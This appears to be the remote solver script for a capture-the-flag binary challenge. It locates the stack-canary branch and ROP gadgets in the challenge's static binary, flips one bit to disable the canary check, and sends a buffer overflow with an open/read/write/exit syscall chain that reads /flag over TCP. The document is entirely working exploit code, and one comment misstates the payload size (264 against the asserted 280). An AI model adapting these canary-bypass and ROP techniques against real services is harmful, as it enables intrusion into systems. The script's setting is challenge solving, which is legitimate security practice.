#!/usr/bin/env bash
# Remote solver: drives the bit-challenge service over TCP.
#
#   ./solve/solve-remote.sh <host> <port>
#
# Same exploit as solve.sh: bit-flip canary `je`, then build an ORW
# syscall ROP chain through the anchored gadgets in static glibc to
# read /flag and write it to stdout. Finally exit(0) to terminate
# cleanly — without that last syscall, ret pops a stale main-pointer
# from __libc_start_main's frame, main re-enters with a valid canary,
# and the patched jne now FAILS and aborts.

set -euo pipefail

host=${1:?usage: $0 <host> <port>}
port=${2:?usage: $0 <host> <port>}

cd "$(dirname "$0")/../service"

dbg=bit.dbg
bin=bit
if [[ ! -f $dbg || src/echo.c -nt $dbg ]]; then
    make -C src
    cp src/$bin $bin
    cp src/$dbg $dbg
fi

python3 - "$host" "$port" <<'PY'
import re, socket, struct, subprocess, sys, time
from elftools.elf.elffile import ELFFile

host, port = sys.argv[1], int(sys.argv[2])
p = lambda x: struct.pack("<Q", x)

# --- collect everything we need from bit.dbg ------------------------
text_vaddr = text_foff = text_size = None
ro_vaddr = ro_foff = ro_size = None
bss_vaddr = None
with open("bit.dbg", "rb") as f:
    elf = ELFFile(f)
    for sec in elf.iter_sections():
        if sec.name == ".text":
            text_vaddr, text_foff, text_size = sec["sh_addr"], sec["sh_offset"], sec["sh_size"]
        elif sec.name == ".rodata":
            ro_vaddr, ro_foff, ro_size = sec["sh_addr"], sec["sh_offset"], sec["sh_size"]
        elif sec.name == ".bss":
            bss_vaddr = sec["sh_addr"]
    f.seek(0)
    full = f.read()

i = full.find(b"/flag\x00", ro_foff, ro_foff + ro_size)
flag_vaddr = ro_vaddr + (i - ro_foff)

# --- canary `je` in main -------------------------------------------
dis = subprocess.check_output(
    ["objdump", "-d", "--disassemble=main", "-M", "intel", "bit.dbg"]
).decode()
lines = dis.splitlines()
canary_je_vaddr = None
for i, ln in enumerate(lines):
    if re.search(r"sub\s+rdx,QWORD PTR fs:0x28", ln):
        for j in range(i + 1, min(i + 6, len(lines))):
            m = re.match(r"^\s*([0-9a-f]+):\s*74\s", lines[j])
            if m:
                canary_je_vaddr = int(m.group(1), 16)
                break
        break
je_foff         = canary_je_vaddr - text_vaddr + text_foff
WANT_BIT_OFFSET = je_foff * 8 + 0

# --- ROP gadgets ---------------------------------------------------
def find(pat):
    off = full.find(pat, text_foff, text_foff + text_size)
    return None if off < 0 else off - text_foff + text_vaddr
g_pop_rdi = find(b"\x5f\xc3")
g_pop_rsi = find(b"\x5e\xc3")
g_pop_rdx = find(b"\x5a\xc3")
g_pop_rax = find(b"\x58\xc3")
g_syscall = find(b"\x0f\x05\xc3")
bss_buf = bss_vaddr + 0x200
READ_LEN = 64

print(f"[*] /flag         = 0x{flag_vaddr:x}",   file=sys.stderr)
print(f"[*] .bss buffer   = 0x{bss_buf:x}",      file=sys.stderr)
print(f"[*] pop rdi;ret   = 0x{g_pop_rdi:x}",    file=sys.stderr)
print(f"[*] pop rsi;ret   = 0x{g_pop_rsi:x}",    file=sys.stderr)
print(f"[*] pop rdx;ret   = 0x{g_pop_rdx:x}",    file=sys.stderr)
print(f"[*] pop rax;ret   = 0x{g_pop_rax:x}",    file=sys.stderr)
print(f"[*] syscall;ret   = 0x{g_syscall:x}",    file=sys.stderr)
print(f"[*] canary je @   = 0x{canary_je_vaddr:x}", file=sys.stderr)
print(f"[*] want bit off  = {WANT_BIT_OFFSET} (0x{WANT_BIT_OFFSET:x})", file=sys.stderr)

# --- payload (264 bytes; read window is 512) -----------------------
filler = b"A" * 88
chain  = b""
# open("/flag", O_RDONLY)
chain += p(g_pop_rdi) + p(flag_vaddr) + p(g_pop_rsi) + p(0) + p(g_pop_rax) + p(2) + p(g_syscall)
# read(3, &bss_buf, 64)
chain += p(g_pop_rdi) + p(3) + p(g_pop_rsi) + p(bss_buf) + p(g_pop_rdx) + p(READ_LEN) + p(g_pop_rax) + p(0) + p(g_syscall)
# write(1, &bss_buf, 64) — rsi/rdx carry over from read
chain += p(g_pop_rdi) + p(1) + p(g_pop_rax) + p(1) + p(g_syscall)
# exit(0)
chain += p(g_pop_rax) + p(60) + p(g_syscall)
payload = filler + chain
assert len(payload) == 280, len(payload)

# --- talk to the service -------------------------------------------
print(f"[*] connecting to {host}:{port} ...", file=sys.stderr)
s = socket.create_connection((host, port), timeout=10)
s.settimeout(5)
buf = b""

def recv_until(token):
    global buf
    while token not in buf:
        chunk = s.recv(4096)
        if not chunk:
            sys.exit(f"connection closed waiting for {token!r}; buf={buf!r}")
        buf += chunk

def send(data):
    s.sendall(data)
    time.sleep(0.05)

recv_until(b"[y/N]")
send(b"y\n")
recv_until(b"salt for this rite:")
recv_until(b"\n")
m = re.search(rb"salt for this rite:\s*([0-9a-fA-F]{8})", buf)
if not m:
    sys.exit(f"no salt: {buf!r}")
salt = int(m.group(1), 16)
encoded = WANT_BIT_OFFSET ^ salt
print(f"[*] salt    = 0x{salt:08x}",       file=sys.stderr)
print(f"[*] encoded = 0x{encoded:x}",      file=sys.stderr)

recv_until(b"bit fall?")
send(str(encoded).encode() + b"\n")
send(payload)

try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
except (TimeoutError, socket.timeout):
    pass

print("--- transcript ---", file=sys.stderr)
sys.stdout.flush()
sys.stdout.buffer.write(buf)
s.close()
PY
